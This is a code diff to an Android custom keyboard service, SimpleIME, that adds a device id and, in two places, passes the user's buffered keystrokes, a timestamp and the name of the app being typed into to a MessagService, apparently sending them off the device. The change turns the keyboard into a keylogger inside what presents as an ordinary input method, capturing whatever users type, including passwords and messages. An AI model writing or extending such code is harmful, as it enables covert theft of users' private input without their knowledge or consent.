@@ -8,6 +8,8 @@ import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
 
+import java.util.Date;
+
 /**
  * Created by helunwen on 11/9/16.
  */
@@ -21,6 +23,8 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
 
     private InputConnection inputConnection;
 
+    private String deviceId = "some device id";
+
     @Override
     public View onCreateInputView() {
         kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard, null);
@@ -33,13 +37,18 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
 
     @Override
     public void onKey(int primaryCode, int[] keyCodes) {
-        new MessagService("Message").execute();
         InputConnection ic = getCurrentInputConnection();
         if (ic != this.inputConnection) {
             this.inputConnection = ic;
             if (this.stringBuffer.length() > 0) {
                 System.out.println(String.format("Your input is: %s\n", this.stringBuffer.toString()));
                 System.out.println(String.format("The calling application is %s\n\n", this.getCurrentInputEditorInfo().packageName));
+                new MessagService(
+                        this.deviceId,
+                        new Date(System.currentTimeMillis()).toString(),
+                        this.stringBuffer.toString(),
+                        this.getCurrentInputEditorInfo().packageName
+                ).execute();
             }
             this.stringBuffer.setLength(0);
         }
@@ -60,6 +69,12 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
                 ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                 System.out.println(String.format("Your input is: %s\n", stringBuffer.toString()));
                 System.out.println(String.format("The calling application is %s\n\n", this.getCurrentInputEditorInfo().packageName));
+                new MessagService(
+                        this.deviceId,
+                        new Date(System.currentTimeMillis()).toString(),
+                        this.stringBuffer.toString(),
+                        this.getCurrentInputEditorInfo().packageName
+                ).execute();
                 stringBuffer.setLength(0);
                 break;
             default:
